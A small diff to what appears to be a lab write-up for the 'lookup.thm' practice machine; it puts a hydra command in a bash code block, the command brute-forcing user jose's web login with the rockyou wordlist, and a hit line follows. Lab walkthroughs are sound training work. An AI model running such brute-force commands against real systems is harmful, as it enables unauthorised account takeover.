@@ -19,8 +19,9 @@ Using this scripts found  some users:
    
 
 Now lets try a brute force for user jose using hydra:
+``` bash
  hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V
-
+```
 [80][http-post-form] host: lookup.thm   login: jose   password:
 
 found one valid password for jose
